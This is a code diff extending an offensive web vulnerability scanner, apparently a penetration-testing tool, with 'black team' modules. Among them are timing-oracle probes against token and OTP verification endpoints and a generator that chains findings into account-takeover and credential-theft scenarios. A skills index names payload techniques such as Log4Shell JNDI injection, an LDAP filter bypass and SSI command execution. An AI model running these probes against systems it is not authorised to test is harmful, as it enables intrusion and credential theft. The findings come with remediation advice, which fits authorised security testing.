+                            "SSRF to internal services is possible."
+                        ),
+                        poc_curl="\n".join(poc_lines[:3]),
+                        category="SSRF",
+                        remediation="Validate webhook URLs against an allowlist. Block RFC1918, loopback, link-local addresses. Use async job queue with network isolation."
+                    ))
+            except Exception:
+                pass
+        return profile
+
+# ── Tool 119: Timing Oracle / Secret Enumeration (SKILL-129) ──
+class TimingOracleEnum:
+    """Detect timing oracles in token comparison endpoints (fixed-length secrets)."""
+    NAME = "Timing Oracle"
+    import time as _time_mod
+    ENUM_PATHS = [
+        "/api/verify", "/api/token/verify", "/api/auth/verify",
+        "/api/otp/verify", "/api/2fa/verify", "/api/reset/verify",
+        "/api/invite/verify", "/api/email/verify",
+    ]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import time as _time
+        for path in self.ENUM_PATHS:
+            url = profile.url.rstrip("/") + path
+            # Send two tokens that differ only in first character
+            times = []
+            for token in ["0" * 32, "f" * 32, "00000000000000000000000000000001"]:
+                try:
+                    t0 = _time.time()
+                    _fetch(url, cfg.ua, 8, "POST",
+                           json.dumps({"token": token, "code": token}).encode(),
+                           {"Content-Type": "application/json"})
+                    times.append(_time.time() - t0)
+                except Exception:
+                    times.append(0.0)
+            if len(times) >= 2 and times[0] > 0 and times[1] > 0:
+                delta = abs(times[0] - times[1])
+                if delta > 0.1:
+                    profile.findings.append(Finding(
+                        id="TIMING-ORACLE",
+                        title=f"Timing oracle detected on token verification: {path}",
+                        severity="MEDIUM",
+                        cvss=5.9,
+                        cwe="CWE-208",
+                        description=(
+                            f"Token verification at {path} shows timing delta: "
+                            f"t1={times[0]:.3f}s, t2={times[1]:.3f}s (Δ={delta:.3f}s). "
+                            "Non-constant-time comparison may allow secret enumeration."
+                        ),
+                        poc_curl=(
+                            f"# Run 100 times and measure: "
+                            f"for i in $(seq 100); do "
+                            f"curl -sk -w '%{{time_total}}\n' -o /dev/null -X POST {url} "
+                            f"-H 'Content-Type: application/json' -d '{{\"token\":\"0\"}}'; done"
+                        ),
+                        category="Cryptography",
+                        remediation="Use constant-time comparison (hmac.compare_digest in Python, MessageDigest.isEqual in Java). Never use == for secret comparison."
+                    ))
+        return profile
+
+# ── Tool 120: Full Chain PoC Generator (SKILL-130) ────────────
+class FullChainPoCGenerator:
+    """Auto-generate a prioritized exploit chain PoC combining the scan's highest findings."""
+    NAME = "Full Chain PoC Generator"
+    CHAIN_PRIORITY = [
+        "CRITICAL", "HIGH", "MEDIUM",
+    ]
+    CHAIN_COMBOS = [
+        # XSS + CORS = ATO
+        ({"XSS", "CORS"}, "XSS + CORS = Account Takeover", "CRITICAL"),
+        # SSRF + Cloud metadata = credential theft
+        ({"SSRF"}, "SSRF to Cloud Metadata = IAM credential theft", "CRITICAL"),
+        # IDOR + Auth bypass = full account takeover
+        ({"IDOR", "Auth"}, "IDOR + Auth Bypass = Account Takeover", "CRITICAL"),
+        # Subdomain takeover + CSP bypass
+        ({"Subdomain Takeover"}, "Subdomain Takeover → CSP bypass → XSS", "HIGH"),
+        # Open redirect + OAuth = token theft
+        ({"OAuth", "Redirect"}, "Open Redirect + OAuth = Token Theft", "HIGH"),
+        # Cache + reflected = stored-like XSS
+        ({"Cache", "XSS"}, "Cache Poisoning + XSS = Stored-like XSS", "HIGH"),
+        # LFI + Log = RCE via log poisoning
+        ({"LFI"}, "LFI + Log Poisoning = RCE chain", "HIGH"),
+        # JWT + CORS = ATO
+        ({"JWT", "CORS"}, "JWT Algorithm Confusion + CORS = ATO", "CRITICAL"),
+    ]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        if not profile.findings:
+            return profile
+        cats = {f.category for f in profile.findings}
+        ids  = {f.id for f in profile.findings}
+        sev_map = {f.id: f.severity for f in profile.findings}
+        chains_found = []
+        for combo_cats, label, chain_sev in self.CHAIN_COMBOS:
+            # Check if any finding category or ID substring matches the combo
+            match = any(
+                any(c.lower() in cat.lower() or c.lower() in fid.lower()
+                    for cat in cats for fid in ids)
+                for c in combo_cats
+            )
+            if match:
+                chains_found.append((label, chain_sev))
+        # Always produce a top-findings chain
+        top = sorted(profile.findings,
+                     key=lambda f: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}.get(f.severity,5))[:5]
+        chain_steps = "\n".join(
+            f"Step {i+1}: [{f.severity}] {f.title}\n  PoC: {f.poc_curl[:120]}"
+            for i, f in enumerate(top))
+        extra_chains = "\n".join(f"  [CHAIN] {label} ({sev})" for label, sev in chains_found)
+        profile.findings.append(Finding(
+            id="FULL-CHAIN-POC",
+            title=f"Full chain PoC — {len(top)} findings chained, {len(chains_found)} attack combos identified",
+            severity="CRITICAL" if any(s=="CRITICAL" for _,s in chains_found) else "HIGH",
+            cvss=10.0 if chains_found else 8.0,
+            cwe="CWE-1035",
+            description=(
+                f"Top-{len(top)} findings exploit chain for {profile.host}:\n"
+                f"{chain_steps}"
+                + (f"\n\nAttack combos:\n{extra_chains}" if extra_chains else "")
+            ),
+            poc_curl="\n".join(f.poc_curl[:100] for f in top),
+            category="Exploit Chain",
+            remediation="Address CRITICAL and HIGH findings first. Prioritise the chains above as they represent real attack scenarios."
+        ))
+        return profile
+
+# ══════════════════════════════════════════════════════════════
 # REPORTER  (SKILL-29, SKILL-30)
 # ══════════════════════════════════════════════════════════════
 class APEXReporter:
@@ -5079,6 +5917,7 @@ class APEXOrchestrator:
         7: "Advanced: Smuggling + JWT + OAuth + Host Injection + HPP + RateLimit + Cache + SSTI + XXE + ProtoPollu + GQL-Adv + DepConf + BizLogic + WebSocket + BOLA",
         8: "Phase 8: SQLi + NoSQLi + CMDi + Upload + CSRF + Clickjack + MethodTamper + AcctEnum + ACLBypass + APIDowngrade + TLS + ZoneXfer + Deserial + BlindSSRF + EmailInject + JSONP + RefererBypass + 2FA + ErrorIntel + OpenRedirect + HTMLi + CORSPreflight + PwdReset + WebDAV + ContentType + InternalSvc + SubLive + LFI + Session + VDP",
         9: "Phase 9: GQL-Batch + SRI + postMessage + CacheDeception + ServiceWorker + CRLF + SAML + OAuth-Implicit + VHostFuzz + RaceCondition + TokenLeak + CloudMeta-SSRF + ETag + AuthBypassHdr + PathParam + XST + CSS-Inject + CORS-Cred + MassAssign + JWKS + ReDoS + SubTakeoverV2 + HTTP2 + WebSocket-CSWSH + ProtoPollu-Adv + HPP-Adv + IDOR-v2 + ForcedBrowse + SensitiveData + BFLA + GQL-Mutation + CORS-API + SSL-Hints + GQL-FieldSuggest + DepConf-V2 + ErrorHandling + Desync-Adv + OAuth-StateCSRF + DebugEP + BlindCMDi",
+        10: "Phase 10 [BLACK TEAM]: Log4Shell + XPathInject + LDAPInject + SSI/ESI + PDF-SSRF + JWT-AlgConf + BlindXXE-OOB + SSTI-RCE + CachePoison-Adv + OAuth-RefererLeak + SOAP/XML + PHP-TypeJuggle + Webhook-SSRF + TimingOracle + FullChainPoC",
     }
 
     def __init__(self, cfg: Config):
@@ -5140,6 +5979,15 @@ class APEXOrchestrator:
         self.t100 = DependencyConfusionV2(); self.t101 = ImproperErrorHandling()
         self.t102 = HTTPDesyncAdvanced(); self.t103 = OAuthStateCSRF()
         self.t104 = ExposedDebugEndpoints(); self.t105 = BlindCMDInjection()
+        # Tools 106-125: Phase 10 (20 Black Team Skills)
+        self.t106 = Log4ShellScanner(); self.t107 = XPathInjection()
+        self.t108 = LDAPInjection(); self.t109 = SSIInjection()
+        self.t110 = PDFGeneratorSSRF(); self.t111 = JWTAlgorithmConfusion()
+        self.t112 = BlindXXEOOB(); self.t113 = SSTIRCEChain()
+        self.t114 = CachePoisoningAdvanced(); self.t115 = OAuthTokenRefererLeak()
+        self.t116 = SOAPXMLInjection(); self.t117 = PHPTypeJuggling()
+        self.t118 = WebhookSSRF(); self.t119 = TimingOracleEnum()
+        self.t120 = FullChainPoCGenerator()
 
     def _init_profile(self, url: str) -> TargetProfile:
         p = urlparse(url)
@@ -5214,6 +6062,15 @@ class APEXOrchestrator:
                 p = self.t100.run(p, cfg); p = self.t101.run(p, cfg)
                 p = self.t102.run(p, cfg); p = self.t103.run(p, cfg)
                 p = self.t104.run(p, cfg); p = self.t105.run(p, cfg)
+            elif n == 10:
+                p = self.t106.run(p, cfg); p = self.t107.run(p, cfg)
+                p = self.t108.run(p, cfg); p = self.t109.run(p, cfg)
+                p = self.t110.run(p, cfg); p = self.t111.run(p, cfg)
+                p = self.t112.run(p, cfg); p = self.t113.run(p, cfg)
+                p = self.t114.run(p, cfg); p = self.t115.run(p, cfg)
+                p = self.t116.run(p, cfg); p = self.t117.run(p, cfg)
+                p = self.t118.run(p, cfg); p = self.t119.run(p, cfg)
+                p = self.t120.run(p, cfg)
         except KeyboardInterrupt:
             warn("Interrupted — saving partial results...")
         except Exception as e:
@@ -5224,7 +6081,7 @@ class APEXOrchestrator:
         SEP = "═" * 70
         print(f"\n{C.BOLD}{C.WHITE}{SEP}{C.NC}")
         print(f"{C.BOLD}{C.CYAN}  APEX_HUNTER v1.0{C.NC}")
-        print(f"{C.WHITE}  105 Tools | 115 Skills | Auto-Chain Execution{C.NC}")
+        print(f"{C.WHITE}  120 Tools | 130 Skills | Auto-Chain Execution{C.NC}")
         print(f"{C.WHITE}{SEP}{C.NC}")
         print(f"  Targets : {', '.join(self.cfg.targets)}")
         print(f"  Output  : {self.cfg.output}")
@@ -5254,7 +6111,7 @@ class APEXOrchestrator:
 # SKILLS INDEX
 # ══════════════════════════════════════════════════════════════
 SKILLS_INDEX = """
-APEX_HUNTER v1.0 — Skills Index (115 Skills / 105 Tools)
+APEX_HUNTER v1.0 — Skills Index (130 Skills / 120 Tools)
 ═════════════════════════════════════════════════════════
 SKILL-01  DNS resolution & multi-record enumeration
 SKILL-02  TLS version, cipher, certificate, SAN extraction
@@ -5377,6 +6234,23 @@ SKILL-112 HTTP desync advanced — CL.TE/TE.CL differential smuggling probes
 SKILL-113 OAuth state CSRF — missing/predictable state parameter detection
 SKILL-114 Exposed debug endpoints — pprof/jolokia/metrics/telescope/horizon/xdebug
 SKILL-115 Blind OS command injection — echo-marker reflection via safe payloads
+
+NEW (Phase 10 — BLACK TEAM — 15 Advanced Exploitation Skills):
+SKILL-116 Log4Shell (CVE-2021-44228) — JNDI injection in 10 headers + OOB PoC
+SKILL-117 XPath injection — boolean bypass + blind enumeration in auth/search
+SKILL-118 LDAP injection — filter bypass (*(uid=*)) in login/directory endpoints
+SKILL-119 SSI / ESI injection — <!--#exec cmd--> + <esi:include> detection
+SKILL-120 PDF/HTML-to-PDF SSRF — file:// + metadata via headless renderer endpoints
+SKILL-121 JWT algorithm confusion — RS256→HS256 public-key-as-secret forgery
+SKILL-122 Blind XXE OOB — DTD-load payload generator + SVG XXE vector
+SKILL-123 SSTI → RCE chain — Jinja2/Twig/FreeMarker/Velocity class-traversal PoC
+SKILL-124 Cache poisoning advanced — fat GET, unkeyed cookie, X-Original-URL, param cloak
+SKILL-125 OAuth token Referer leak — callback page third-party resource leakage
+SKILL-126 SOAP/XML injection — CDATA injection, Billion Laughs, external entity
+SKILL-127 PHP type juggling — 0e magic hash, null/false coercion, array bypass
+SKILL-128 Webhook/callback SSRF — server-side URL fetch via notification endpoints
+SKILL-129 Timing oracle — non-constant-time token comparison detection
+SKILL-130 Full chain PoC generator — auto-synthesise exploit chain from all findings
 """
 
 # ══════════════════════════════════════════════════════════════
@@ -5384,7 +6258,7 @@ SKILL-115 Blind OS command injection — echo-marker reflection via safe payload
 # ══════════════════════════════════════════════════════════════
 def main():
     p = argparse.ArgumentParser(
-        description="APEX_HUNTER v1.0 — 105 Tools | 115 Skills | Auto-Chain",
+        description="APEX_HUNTER v1.0 — 120 Tools | 130 Skills | Auto-Chain",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -5402,8 +6276,8 @@ Examples:
     p.add_argument("--depth",    type=int,   default=3,   help="Crawl depth")
     p.add_argument("--timeout",  type=int,   default=20,  help="Request timeout (seconds)")
     p.add_argument("--scope",    action="append", default=[], dest="scope_extras")
-    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8,9",
-                   help="Phases to run (default: 1-9, e.g. 1,2,7,8,9)")
+    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8,9,10",
+                   help="Phases to run (default: 1-10, e.g. 1,2,7,8,9,10)")
     p.add_argument("--skills",   action="store_true", help="Print skills index and exit")
     args = p.parse_args()
 
